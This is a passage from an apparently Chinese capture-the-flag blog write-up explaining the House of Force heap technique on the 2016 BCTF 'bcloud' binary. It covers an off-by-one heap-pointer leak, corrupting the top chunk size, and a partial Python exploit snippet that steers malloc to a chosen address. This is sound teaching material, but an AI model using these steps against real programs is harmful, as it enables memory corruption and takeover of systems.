class="comment">//&#x5982;&#x679C;&#x5728;&#x5206;&#x5272;&#x4E4B;&#x540E;&#xFF0C;topchunk&#x7684;&#x5927;&#x5C0F;&#x5927;&#x4E8E;MINSIZE&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;&#x5206;&#x5272;&#x3002;&#x8FD9;&#x91CC;&#x8FD8;&#x9700;&#x8981;&#x52A0;&#x4E0A;MINSIZE&#x662F;&#x7531;&#x4E8E;topchunk&#x5FC5;&#x987B;&#x7559;&#x4E0B;&#x6765;&#x7528;&#x4F5C;fencepost&#xFF0C;&#x4EE5;&#x5206;&#x9694;&#x5806;&#x548C;&#x5176;&#x4ED6;&#x7A7A;&#x95F4;&#x3002;</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">{</span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line">    remainder      = chunk_at_offset(victim, nb);</span><br><span class="line">    <span class="comment">//&#x66F4;&#x65B0;topchunk</span></span><br><span class="line">    av-&gt;top        = remainder;</span><br><span class="line">    set_head(victim, nb | PREV_INUSE |</span><br><span class="line">            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">    check_malloced_chunk(av, victim, nb);</span><br><span class="line">    <span class="keyword">void</span> *p = chunk2mem(victim);</span><br><span class="line">    alloc_perturb(p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">}</span><br></pre></td></tr></table></figure></p>
<p>&#x6E90;&#x7801;&#x4E2D;&#x6709;&#x4E00;&#x6BB5;&#x6CE8;&#x91CA;</p>
<blockquote>
<p>We require that av-&gt;top always exists (i.e., has size &gt;=MINSIZE) after initialization, so if it would otherwise beexhausted by current request, it is replenished. (The mainreason for ensuring it exists is that we may need MINSIZE spaceto put in fenceposts in sysmalloc.)</p>
</blockquote>
<p>&#x5982;&#x679C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x628A;topchunk&#x7684;size&#x7BE1;&#x6539;&#x6210;&#x5F88;&#x5927;&#x7684;&#x503C;&#xFF08;&#x6BD4;&#x5982;&#x5728;x86&#x4E0B;&#x7BE1;&#x6539;&#x4E3A;0xffffffff&#xFF09;&#x5C31;&#x53EF;&#x4EE5;&#x5F88;&#x5BB9;&#x6613;&#x901A;&#x8FC7;&#x8FD9;&#x4E2A;&#x9A8C;&#x8BC1;&#x3002;<br>&#x4E4B;&#x540E;topchunk&#x6307;&#x9488;&#x4F1A;&#x66F4;&#x65B0;&#xFF0C;&#x4E0B;&#x6B21;&#x7533;&#x8BF7;chunk&#x65F6;&#xFF0C;&#x5C31;&#x4F1A;&#x628A;&#x5730;&#x5740;&#x5206;&#x914D;&#x5230;&#x66F4;&#x65B0;&#x540E;&#x7684;topchunk&#x7684;&#x5730;&#x5740;&#x4E0A;&#xFF0C;&#x7528;&#x6237;&#x5982;&#x679C;&#x901A;&#x8FC7;&#x8BE5;&#x65B9;&#x5F0F;&#x63A7;&#x5236;&#x4E86;&#x6307;&#x9488;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x5B9E;&#x73B0;&#x4EFB;&#x610F;&#x5730;&#x5740;&#x7684;&#x8BFB;&#x548C;&#x5199;&#x3002;</p>
<h3 id="2016-BCTF-bcloud"><a href="#2016-BCTF-bcloud" class="headerlink" title="2016-BCTF-bcloud"></a>2016-BCTF-bcloud</h3><p>&#x7A0B;&#x5E8F;&#x7684;&#x4FE1;&#x606F;&#x5982;&#x4E0B;&#xFF1A;<br><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">Canary</span>                        <span class="string">:</span> <span class="literal">Yes</span></span><br><span class="line"><span class="string">NX</span>                            <span class="string">:</span> <span class="literal">Yes</span></span><br><span class="line"><span class="string">PIE</span>                           <span class="string">:</span> <span class="literal">No</span></span><br><span class="line"><span class="string">Fortify</span>                       <span class="string">:</span> <span class="literal">No</span></span><br><span class="line"><span class="string">RelRO</span>                         <span class="string">:</span> <span class="string">Partial</span></span><br></pre></td></tr></table></figure></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">./bcloud</span><br><span class="line">Input your name:</span><br><span class="line">aa</span><br><span class="line">Hey aa! Welcome to BCTF CLOUD NOTE MANAGE SYSTEM!</span><br><span class="line">Now let&apos;s <span class="built_in">set</span> synchronization options.</span><br><span class="line">Org:</span><br><span class="line">bb</span><br><span class="line">Host:</span><br><span class="line">cc</span><br><span class="line">OKay! Enjoy:)</span><br><span class="line"><span class="number">1.</span>New note</span><br><span class="line"><span class="number">2.</span>Show note</span><br><span class="line"><span class="number">3.</span>Edit note</span><br><span class="line"><span class="number">4.</span>Delete note</span><br><span class="line"><span class="number">5.</span>Syn</span><br><span class="line"><span class="number">6.</span>Quit</span><br><span class="line">option---&gt;&gt;</span><br></pre></td></tr></table></figure>
<h3 id="0x02-&#x5E8F;&#x53CA;&#x5229;&#x7528;&#x5206;&#x6790;"><a href="#0x02-&#x5E8F;&#x53CA;&#x5229;&#x7528;&#x5206;&#x6790;" class="headerlink" title="0x02 &#x5E8F;&#x53CA;&#x5229;&#x7528;&#x5206;&#x6790;"></a>0x02 &#x5E8F;&#x53CA;&#x5229;&#x7528;&#x5206;&#x6790;</h3><h4 id="1-&#x6CC4;&#x9732;&#x5806;&#x6307;&#x9488;"><a href="#1-&#x6CC4;&#x9732;&#x5806;&#x6307;&#x9488;" class="headerlink" title="1.&#x6CC4;&#x9732;&#x5806;&#x6307;&#x9488;"></a>1.&#x6CC4;&#x9732;&#x5806;&#x6307;&#x9488;</h4><p>&#x7A0B;&#x5E8F;&#x6709;&#x4E00;&#x4E2A;&#x81EA;&#x5B9A;&#x4E49;&#x7684;read&#x51FD;&#x6570;&#xFF0C;&#x5176;&#x529F;&#x80FD;&#x5C31;&#x662F;&#x5C06;&#x7528;&#x6237;&#x7684;&#x8F93;&#x5165;&#x4E00;&#x4E2A;&#x5B57;&#x8282;&#x4E00;&#x4E2A;&#x5B57;&#x8282;&#x5199;&#x5165;&#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x6307;&#x5B9A;&#x7684;&#x5730;&#x5740;&#xFF0C;&#x7A0B;&#x5E8F;&#x6709;&#x5F88;&#x591A;&#x5730;&#x65B9;&#x8C03;&#x7528;&#x4E86;&#x8BE5;&#x51FD;&#x6570;&#xFF0C;&#x6BD4;&#x5982;&#x5728;&#x7A0B;&#x5E8F;&#x521D;&#x59CB;&#x5316;&#x65F6;&#x8F93;&#x5165;name&#x3001;Org&#x3001;Host&#x65F6;&#x5C31;&#x8C03;&#x7528;&#x4E86;&#x8BE5;&#x51FD;&#x6570;&#x3002;<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_804868D</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">char</span> a3)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+1Bh] [ebp-Dh]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; a2; ++i )</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">if</span> ( read(<span class="number">0</span>, &amp;buf, <span class="number">1u</span>) &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( buf == a3 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(_BYTE *)(a1 + i) = buf;</span><br><span class="line">  }</span><br><span class="line">  *(_BYTE *)(i + a1) = <span class="number">0</span>;   <span class="comment">//* off by one</span></span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">}</span><br></pre></td></tr></table></figure></p>
<p>&#x5728;&#x8F93;&#x5165;name&#x65F6;&#xFF0C;&#x7531;&#x4E8E;&#x5185;&#x5B58;&#x5E03;&#x5C40;&#x6709;&#x95EE;&#x9898;&#xFF0C;&#x56E0;&#x6B64;&#x4E0A;&#x8FF0;&#x81EA;&#x5B9A;&#x4E49;&#x7684;read&#x51FD;&#x6570;*&#x5904;&#x5C31;&#x51FA;&#x73B0;&#x4E86;off by one &#x6F0F;&#x6D1E;<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">input_name</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+1Ch] [ebp-5Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// [esp+5Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+6Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x50</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your name:&quot;</span>);</span><br><span class="line">  iread((<span class="keyword">int</span>)&amp;s, <span class="number">64</span>, <span class="number">10</span>);</span><br><span class="line">  v2 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x40</span>u);</span><br><span class="line">  dword_804B0CC = (<span class="keyword">int</span>)v2;</span><br><span class="line">  <span class="built_in">strcpy</span>(v2, &amp;s);</span><br><span class="line">  sub_8048779(v2);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">}</span><br></pre></td></tr></table></figure></p>
<p>&#x4ECE;&#x4E0A;&#x9762;&#x7684;&#x6CE8;&#x91CA;&#x53EF;&#x4EE5;&#x77E5;&#x9053;s&#x548C;v2&#x5728;&#x6808;&#x4E2D;&#x7684;&#x4F4D;&#x7F6E;<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="code">+------------+</span></span><br><span class="line">|    v2      |  # ebp-0x1c</span><br><span class="line"><span class="code">+------------+</span></span><br><span class="line">|    ...     |  # &#x4E2D;&#x95F4;&#x6709;63&#x4E2A;&#x5355;&#x4F4D;&#x7684;&#x7A7A;&#x95F4;</span><br><span class="line"><span class="code">+------------+</span></span><br><span class="line">|     s      |  # ebp-0x5c</span><br><span class="line"><span class="code">+------------+</span></span><br></pre></td></tr></table></figure></p>
<p>&#x6240;&#x4EE5;&#x5F53;name&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x957F;&#x5EA6;&#x4E3A;64&#x65F6;&#xFF0C;iread&#x51FD;&#x6570;&#x4F1A;&#x5728;&#x5176;&#x540E;&#x52A0;&#x4E0A;&#x2019;\x00&#x2019;&#x4F5C;&#x4E3A;&#x5B57;&#x7B26;&#x4E32;&#x622A;&#x65AD;&#x7B26;&#xFF0C;&#x4F46;&#x662F;&#x8FD9;&#x4E2A;&#x4F4D;&#x7F6E;&#x5728;input_name&#x51FD;&#x6570;&#x4E2D;&#x5B58;&#x653E;&#x7684;&#x662F;v2&#x7684;&#x5730;&#x5740;&#xFF0C;v2&#x662F;&#x5806;&#x6307;&#x9488;&#x3002;&#x56E0;&#x4E3A;strcpy&#x51FD;&#x6570;&#x590D;&#x5236;&#x5185;&#x5B58;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x662F;&#x4EE5;&#x2019;\x00&#x2019;&#x4E3A;&#x622A;&#x65AD;&#x7B26;&#xFF0C;&#x56E0;&#x6B64;&#x5F53;name&#x4E3A;64&#x5B57;&#x8282;&#x65F6;&#xFF0C;&#x7A0B;&#x5E8F;&#x4F1A;&#x5C06;v2&#x7684;&#x5730;&#x5740;&#x6253;&#x5370;&#x51FA;&#x6765;&#xFF0C;&#x5728;&#x6B64;&#x5904;<code>Hey aa! Welcome</code>&#x6CC4;&#x9732;&#x5806;&#x6307;&#x9488;&#x3002;</p>
<h4 id="2-&#x4FEE;&#x6539;topchunk&#x7684;&#x5927;&#x5C0F;&#x4E3A;0xffffffff"><a href="#2-&#x4FEE;&#x6539;topchunk&#x7684;&#x5927;&#x5C0F;&#x4E3A;0xffffffff" class="headerlink" title="2.&#x4FEE;&#x6539;topchunk&#x7684;&#x5927;&#x5C0F;&#x4E3A;0xffffffff"></a>2.&#x4FEE;&#x6539;topchunk&#x7684;&#x5927;&#x5C0F;&#x4E3A;0xffffffff</h4><p>&#x5728;&#x8F93;&#x5165;Org&#x5904;&#xFF0C;&#x4E5F;&#x5B58;&#x5728;&#x540C;&#x6837;&#x7684;&#x95EE;&#x9898;<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">input_org_host</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+1Ch] [ebp-9Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// [esp+5Ch] [ebp-5Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+60h] [ebp-58h]</span></span><br><span class="line">  <span class="keyword">char</span> *v4; <span class="comment">// [esp+A4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+ACh] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x90</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Org:&quot;</span>);</span><br><span class="line">  iread((<span class="keyword">int</span>)&amp;s, <span class="number">64</span>, <span class="number">10</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Host:&quot;</span>);</span><br><span class="line">  iread((<span class="keyword">int</span>)&amp;v3, <span class="number">64</span>, <span class="number">10</span>);</span><br><span class="line">  v4 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x40</span>u);</span><br><span class="line">  v2 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x40</span>u);</span><br><span class="line">  dword_804B0C8 = (<span class="keyword">int</span>)v2;</span><br><span class="line">  dword_804B148 = (<span class="keyword">int</span>)v4;</span><br><span class="line">  <span class="built_in">strcpy</span>(v4, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v3);</span><br><span class="line">  <span class="built_in">strcpy</span>(v2, &amp;s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;OKay! Enjoy:)&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v5;</span><br><span class="line">}</span><br></pre></td></tr></table></figure></p>
<p>&#x4ECE;&#x4E0A;&#x9762;&#x7684;&#x6CE8;&#x91CA;&#x53EF;&#x4EE5;&#x77E5;&#x9053;&#x4E00;&#x4E9B;&#x53D8;&#x91CF;&#x7684;&#x4F4D;&#x7F6E;<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="code">+------------+</span></span><br><span class="line">|    v4      |  # ebp-0x14</span><br><span class="line"><span class="code">+------------+</span></span><br><span class="line">|    ...     |  </span><br><span class="line"><span class="code">+------------+</span></span><br><span class="line">|  Host(v3)  |  # ebp-0x58</span><br><span class="line"><span class="code">+------------+</span></span><br><span class="line">|     v2     |  # ebp-0x5c</span><br><span class="line"><span class="code">+------------+</span></span><br><span class="line">|    ...     |  # &#x4E2D;&#x95F4;&#x6709;63&#x4E2A;&#x5355;&#x4F4D;&#x7684;&#x7A7A;&#x95F4;</span><br><span class="line"><span class="code">+------------+</span></span><br><span class="line">|   Org(s)   |  # ebp-0x9c</span><br><span class="line"><span class="code">+------------+</span></span><br></pre></td></tr></table></figure></p>
<p>&#x5F53;&#x6211;&#x4EEC;Org&#x4E3A;64&#x4E2A;&#x5B57;&#x8282;&#x65F6;&#xFF0C;Org&#x7684;&#x7684;&#x622A;&#x65AD;&#x7B26;&#x2019;\x00&#x2019;&#x88AB;v2&#x622A;&#x65AD;&#xFF0C;&#x5F53;&#x6267;&#x884C;strcpy&#x51FD;&#x6570;&#x65F6;&#x4F1A;&#x5C06;Org&#x5F00;&#x59CB;&#x5230;Host&#x7ED3;&#x675F;&#x7684;&#x6240;&#x6709;&#x6570;&#x636E;&#x590D;&#x5236;&#x5230;v2&#x8FD9;&#x4E2A;&#x5806;&#x6307;&#x9488;&#x6307;&#x5411;&#x7684;&#x5185;&#x5B58;&#x533A;&#x57DF;&#xFF0C;&#x800C;&#x6B64;&#x65F6;v2&#x662F;&#x8DDD;&#x79BB;topchunk&#x6700;&#x8FD1;&#x7684;chunk&#xFF0C;&#x4F46;&#x662F;&#x5176;chunkdata&#x5927;&#x5C0F;&#x53EA;&#x6709;0x40(64)&#xFF0C;&#x6240;&#x4EE5;&#x6267;&#x884C;<code>strcpy(v2, &amp;s);</code>&#x540E;&#xFF0C;v2&#x88AB;&#x8986;&#x76D6;&#x5230;&#x4E86;topchunk&#x7684;pprev_size&#x5904;&#xFF0C;Host(v3)&#x8986;&#x76D6;&#x5230;topchunk&#x7684;size&#x90E8;&#x5206;&#x3002;&#x8FD9;&#x6837;&#x5C31;&#x53EF;&#x4EE5;&#x4FEE;&#x6539;topchunk&#x7684;&#x5927;&#x5C0F;&#x4E3A;0xffffffff</p>
<h4 id="3-&#x7533;&#x8BF7;&#x6B63;&#x786E;&#x5927;&#x5C0F;&#x7684;&#x5185;&#x5B58;&#xFF0C;&#x4FEE;&#x6539;topchun&#x7684;&#x6307;&#x9488;&#x5230;0x804b118"><a href="#3-&#x7533;&#x8BF7;&#x6B63;&#x786E;&#x5927;&#x5C0F;&#x7684;&#x5185;&#x5B58;&#xFF0C;&#x4FEE;&#x6539;topchun&#x7684;&#x6307;&#x9488;&#x5230;0x804b118" class="headerlink" title="3.&#x7533;&#x8BF7;&#x6B63;&#x786E;&#x5927;&#x5C0F;&#x7684;&#x5185;&#x5B58;&#xFF0C;&#x4FEE;&#x6539;topchun&#x7684;&#x6307;&#x9488;&#x5230;0x804b118"></a>3.&#x7533;&#x8BF7;&#x6B63;&#x786E;&#x5927;&#x5C0F;&#x7684;&#x5185;&#x5B58;&#xFF0C;&#x4FEE;&#x6539;topchun&#x7684;&#x6307;&#x9488;&#x5230;0x804b118</h4><p>&#x7B2C;&#x4E00;&#x6B65;&#x6CC4;&#x9732;&#x7684;&#x5806;&#x6307;&#x9488;&#x7684;&#x5730;&#x5740;&#xFF0C;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x8BA1;&#x7B97;&#x51FA;topchunk&#x6307;&#x9488;&#x7684;&#x5730;&#x5740;&#x3002;&#x7B2C;&#x4E8C;&#x6B65;&#x4FEE;&#x6539;&#x4E86;topchunk&#x7684;size&#x4E3A;0xffffffff&#xFF0C;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x7533;&#x8BF7;&#x8DB3;&#x591F;&#x5927;&#x7684;chunk&#xFF0C;&#x8BA9;topchunk&#x7684;&#x6307;&#x9488;&#x6307;&#x5411;&#x6211;&#x4EEC;&#x60F3;&#x8981;&#x7684;&#x5730;&#x5740;&#xFF0C;&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x9009;&#x62E9;0x804B118&#xFF0C;&#x4ECE;&#x4E0B;&#x9762;&#x4F2A;&#x4EE3;&#x7801;*&#x5904;&#x53EF;&#x4EE5;&#x770B;&#x51FA;&#xFF0C;0x804B120&#x5B58;&#x653E;&#x7684;&#x662F;&#x6BCF;&#x4E00;&#x4E2A;chunk&#x7684;&#x5806;&#x6307;&#x9488;&#x3002;&#x5F53;topchunk&#x6307;&#x9488;&#x4E3A;0x805b118&#x65F6;&#xFF0C;&#x65B0;&#x7533;&#x8BF7;&#x7684;chunk&#x7684;data&#x5730;&#x5740;&#x5C31;&#x662F;0x804b120&#x3002;<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">newNote</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+18h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span> &amp;&amp; dword_804B120[i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i == <span class="number">10</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Lack of space. Upgrade your account with just $100 :)&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input the length of the note content:&quot;</span>);</span><br><span class="line">  v2 = sub_8048709();</span><br><span class="line">  dword_804B120[i] = (<span class="keyword">int</span>)<span class="built_in">malloc</span>(v2 + <span class="number">4</span>); <span class="comment">//*</span></span><br><span class="line">  <span class="keyword">if</span> ( !dword_804B120[i] )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  dword_804B0A0[i] = v2;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input the content:&quot;</span>);</span><br><span class="line">  iread(dword_804B120[i], v2, <span class="number">10</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Create success, the id is %d\n&quot;</span>, i);</span><br><span class="line">  result = i;</span><br><span class="line">  dword_804B0E0[i] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></table></figure></p>
<p>&#x9996;&#x5148;&#x6211;&#x4EEC;&#x8981;&#x6B63;&#x786E;&#x8BA1;&#x7B97;&#x7533;&#x8BF7;&#x7684;chunk&#xFF0C;&#x8BA9;topchunk&#x6307;&#x9488;&#x6307;&#x5411;0x804B118&#xFF0C;&#x56E0;&#x4E3A;&#x9700;&#x8981;0x8&#x4E2A;&#x5B57;&#x8282;&#x5B58;&#x653E;precv_size&#x548C;size&#x3002;<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">note_list = <span class="number">0x804B120</span></span><br><span class="line">target_addr = note_list - <span class="number">0x8</span></span><br><span class="line">top_addr = leakheap_addr + <span class="number">0x40</span> + <span class="number">0x48</span> + <span class="number">0x48</span> + <span class="number">24</span></span><br><span class="line">log.success(<span class="string">&quot;top_addr: &quot;</span>+hex(top_addr))</span><br><span class="line">malloc_size = -(top_addr-target_addr) - <span class="number">0x4</span> <span class="number">-0x8</span></span><br><span class="line">log.success(<span class="string">&quot;malloc_size: &quot;</span>+hex(malloc_size))</span><br><span class="line">newNote(<span class="number">0x10</span>,<span class="string">&apos;aaaa&apos;</span>)</span><br><span class="line">newNote(malloc_size,<span class="string">&apos;cccc&apos;</span>)</span><br></pre></td></tr></table></figure></p>
<p>&#x6B64;&#x65F6;&#x7684;top_addr&#x662F;&#x5728;*&#x4E4B;&#x524D;&#x7684;topchunk&#x7684;&#x6307;&#x9488;&#xFF0C;&#x5176;&#x4E2D;0x40+0x48+0x48&#x662F;&#x4FDD;&#x5B58;name&#x3001;org&#x3001;host&#x7684;&#x5927;&#x5C0F;</p>
<h5 id="glibc&#x4F1A;&#x5BF9;&#x7533;&#x8BF7;&#x7684;&#x5185;&#x5B58;&#x5927;&#x5C0F;&#x8FDB;&#x884C;&#x8C03;&#x6574;"><a href="#glibc&#x4F1A;&#x5BF9;&#x7533;&#x8BF7;&#x7684;&#x5185;&#x5B58;&#x5927;&#x5C0F;&#x8FDB;&#x884C;&#x8C03;&#x6574;" class="headerlink" title="glibc&#x4F1A;&#x5BF9;&#x7533;&#x8BF7;&#x7684;&#x5185;&#x5B58;&#x5927;&#x5C0F;&#x8FDB;&#x884C;&#x8C03;&#x6574;"></a>glibc&#x4F1A;&#x5BF9;&#x7533;&#x8BF7;&#x7684;&#x5185;&#x5B58;&#x5927;&#x5C0F;&#x8FDB;&#x884C;&#x8C03;&#x6574;</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* pad request bytes into a usable size -- internal version */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> request2size(req)                                         \</span></span><br><span class="line">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</span><br><span class="line">   MINSIZE :                                                      \</span><br><span class="line">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br></pre></td></tr></table></figure>
<p>&#x5176;&#x4E2D;&#x5728;32&#x4F4D;&#x7CFB;&#x7EDF;&#x4E0B;SIZE_SZ=4&#xFF0C;MALLOC_ALIGN_MASK=8-1=7</p>
